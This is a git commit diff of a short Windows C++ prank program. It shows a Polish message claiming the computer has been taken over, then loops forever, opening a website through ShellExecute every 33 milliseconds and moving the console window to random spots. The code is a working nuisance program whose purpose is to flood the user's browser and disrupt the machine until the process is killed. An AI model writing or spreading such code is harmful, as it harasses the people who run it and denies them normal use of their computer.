3959f2c0e9b8056b781ca7df73b9597c4e0048ac
Nefr0l <119403760+Nefr0l@users.noreply.github.com>
2022-12-09 15:07:54 +0100

    Add files via upload

--- main.cpp
+++ main.cpp
@@ -12,17 +12,18 @@ int number4;
 
 int main()
 {
-    for (int i = 0; i < 20; i++) {
-	for (int i = 0; i < 1000; i++) {
-        HWND hWnd = GetConsoleWindow();
-        number = rand() % 500;
-        number2 = rand() % 500;
-        number3 = rand() % 2000;
-        number4 = rand() % 2000;
-        ShellExecute(0, 0, "http://www.rrogacz.pl", 0, 0 , SW_SHOW );
-        Sleep(333);
-        MoveWindow(hWnd,number,number2,number3,number4,TRUE);
-	}
+    MessageBox(0, "rogacz przej¹³ twoj komputer", "MessageBox caption", MB_OK);
+    while (true) {
+	    for (int i = 0; i < 1000; i++) {
+            HWND hWnd = GetConsoleWindow();
+            number = rand() % 500;
+            number2 = rand() % 500;
+            number3 = rand() % 2000;
+            number4 = rand() % 2000;
+            ShellExecute(0, 0, "http://www.rrogacz.pl", 0, 0 , SW_SHOW );
+
+            Sleep(33);
+            MoveWindow(hWnd,number,number2,number3,number4,TRUE);
+	    }
     }
-	//return 0;
 }
